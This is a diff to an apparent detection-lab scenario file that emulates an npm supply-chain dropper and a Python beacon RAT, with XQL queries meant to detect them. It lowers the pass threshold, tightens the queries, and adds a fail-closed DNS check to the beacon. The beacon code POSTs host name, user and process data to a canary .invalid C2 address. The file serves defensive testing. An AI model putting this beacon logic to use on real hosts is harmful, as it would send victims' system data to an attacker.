@@ -105,7 +105,7 @@ primary_kpi: "Detection Accuracy"
 threshold:
   kpi: "Detection Accuracy"
   op: "≥"
-  value: 25
+  value: 12.5
   unit: "%"
 success_criteria: |
   Eight step-detections are declared, of two kinds.
@@ -123,12 +123,16 @@ success_criteria: |
   Tier-2-verify-only (6 of 8): the XQL rows on step-01 to step-06. They are
   scored by POST /api/runs/{id}/verify, which looks back one hour from when it
   runs, so verify within the hour. They never raise Detection Accuracy.
-  PASS: Detection Accuracy of at least 25%, which is both alert-backed rows
-  (2 of 8). Detection Accuracy counts only alert-backed observations, so 25%
-  is the ceiling as well as the bar. Without CR-KOI-0012 installed the best
-  possible result is 12.5% and the run reads as failed. The bound index row
-  carries a qualitative threshold, so a machine PASS is recorded as
-  not_applicable (evidence, not a scored pass); a FAIL stands.
+  PASS: Detection Accuracy of at least 12.5%, which is the built-in verdict
+  alone (1 of 8). Detection Accuracy counts only alert-backed observations,
+  so the ceiling is 25% (2 of 8) and is reached only when the operator has
+  installed CR-KOI-0012. The bar is set at the built-in verdict on purpose:
+  on 2026-11-11 the lab tenant listed no custom correlation rule, and a bar
+  of 25% would read a tenant that detects the payload exactly as observed as
+  a failed run. A missing CR-KOI-0012 therefore shows as one missed row, not
+  as a failed run. The bound index row carries a qualitative threshold, so a
+  machine PASS is recorded as not_applicable (evidence, not a scored pass);
+  a FAIL stands.
   Expected but not scored: all six XQL rows pass Tier-2 verify, and the two
   Medium-or-higher issues share one case. Only Medium-or-higher issues create
   or join a case.
@@ -228,7 +232,9 @@ steps:
     # (FILE_CREATE_NEW / FILE_WRITE were recorded under /var/tmp in this lab on
     # 2026-11-11; FILE_DIR_CREATE, the sub-type Unit 42's package-directory
     # query keys on, has not been observed here), then a python3 PROCESS_START
-    # whose command line names .../plain-crypto-js/setup.js. That process does
+    # whose command line names .../plain-crypto-js/setup.js (the declared row
+    # also requires a python image name, so step-04's `rm` of the same path
+    # cannot satisfy it). That process does
     # the dropper's real decode: reverse, Base64-decode, XOR with the published
     # key. STAGED: npm install and `node setup.js` do not run (no node on the
     # endpoint), and nothing is declared on them. This is the root step.
@@ -339,7 +345,7 @@ steps:
         verification_xql: |
           dataset = xdr_data
           | filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_DIR_CREATE, ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE) and action_file_path contains "/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js")
-             or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_command_line contains "/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js/setup.js")
+             or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_name ~= "^python" and action_process_image_command_line contains "/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js/setup.js")
           | fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line
 
   - id: step-02
@@ -369,7 +375,8 @@ steps:
       # Benign by construction:
       #   - no listening socket; tasking is read only from a spool inside the sandbox
       #   - peinject runs only a file this script wrote under the sandbox
-      #   - the HTTP POST goes to a .invalid name, bounded to 3 s, and is expected to fail
+      #   - the HTTP POST goes to a .invalid name, bounded to 3 s, and is expected to fail;
+      #     if that name ever resolves (a resolver that rewrites NXDOMAIN), nothing is sent
       #   - it exits when told to (kill), 15 minutes after launch, or when the sandbox is gone
       # Published by Unit 42: C2 URL as the only argument, Base64-encoded JSON by HTTP POST,
       # a 60 s beacon, one hard-coded user-agent, and the verbs kill / runscript / peinject / rundir.
@@ -383,6 +390,7 @@ steps:
       import platform
       import random
       import shlex
+      import socket
       import string
       import subprocess
       import sys
@@ -443,6 +451,20 @@ steps:
               fh.write(wire)
 
           def send():
+              # Fail closed. A .invalid name must never resolve (RFC 6761). On a
+              # resolver that rewrites NXDOMAIN it would, and the body carries this
+              # host's name, user and process list: in that case nothing is sent.
+              target = urllib.parse.urlsplit(C2_URL)
+              try:
+                  socket.getaddrinfo(target.hostname, target.port or 80)
+              except socket.gaierror:
+                  pass
+              except Exception as exc:
+                  log("post %s skipped: lookup error %s" % (message["type"], exc.__class__.__name__))
+                  return
+              else:
+                  log("post %s skipped: the canary name resolved, nothing was sent" % message["type"])
+                  return
               try:
                   req = urllib.request.Request(C2_URL, data=wire, method="POST",
                                                headers={"User-Agent": USER_AGENT})
@@ -615,7 +637,10 @@ steps:
     # What the sensor records: PROCESS_START of nohup and then python3 with the
     # command line `python3 <root>/tmp/ld.py http://<canary>:8000/6202033`,
     # the shape of Figure 1's Linux line. Match the command line, not the image
-    # name: the agent may report python3 as python3.12. The process is
+    # name: the agent may report python3 as python3.12. The declared row keys on
+    # `ld.py <URL>` (the script path followed by the URL), because step-02's
+    # curl line also carries both the path and the port and must not satisfy
+    # it. The process is
     # long-lived, reads /proc for its host profile, and tries an HTTP POST to
     # the canary now and every 60 s; each attempt fails name resolution, so
     # nothing reaches the network. With the causality contract the beacon runs
@@ -664,7 +689,7 @@ steps:
         verification_xql: |
           dataset = xdr_data
           | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
-          | filter action_process_image_command_line contains "/var/tmp/.cortexsim-axios/tmp/ld.py" and action_process_image_command_line contains ":8000/6202033"
+          | filter action_process_image_command_line ~= "/var/tmp/[.]cortexsim-axios/tmp/ld[.]py +https?://" and action_process_image_command_line contains ":8000/6202033"
           | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_name, action_process_image_command_line
 
   - id: step-04
